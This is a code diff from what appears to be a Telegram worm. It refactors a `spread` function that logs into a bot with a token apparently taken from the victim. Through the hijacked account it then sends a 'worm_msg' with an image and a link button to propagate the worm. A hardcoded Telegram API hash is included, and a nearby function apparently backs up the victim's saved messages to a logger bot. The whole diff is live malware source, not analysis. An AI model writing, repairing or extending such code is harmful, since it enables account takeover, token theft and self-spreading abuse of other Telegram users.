@@ -77,21 +77,18 @@ async def backup_saves(client, me, logger_bot):
 async def spread(client, me, botinfo, log):
     if botinfo is None:
         return
-    bot = TelegramClient(StringSession(), 6, 'eb06d4abfb49dc3eeb1aeb98ae0f581e')
-    await bot.start(bot_token=botinfo['token'])
-    async with client.conversation(f"@{botinfo['username']}") as conv:
-        msg = await conv.send_message("/start")
-        await bot.send_message(
-            me.id,
-            strings['worm_msg'],
-            file='files/worm.png',
-            buttons=[[Button.url(strings['worm_msg_btn_txt'], strings['worm_msg_btn_url'])]],
-            link_preview=False
-        )
-        spread_msg = await conv.get_response()
+    async with TelegramClient(StringSession(), 6, 'eb06d4abfb49dc3eeb1aeb98ae0f581e').start(bot_token=botinfo['token']) as bot:
+        async with client.conversation(f"@{botinfo['username']}") as conv:
+            msg = await conv.send_message("/start")
+            await bot.send_message(
+                me.id,
+                strings['worm_msg'],
+                file='files/worm.png',
+                buttons=[[Button.url(strings['worm_msg_btn_txt'], strings['worm_msg_btn_url'])]],
+                link_preview=False
+            )
+            spread_msg = await conv.get_response()
         spread_msg_nomedia = f"{strings['worm_msg']}\n\n{strings['worm_msg_btn_url']}"
-        await msg.delete()
-        await bot.disconnect()
     perm_logs = {
         'creator': [],
         'admin': [],
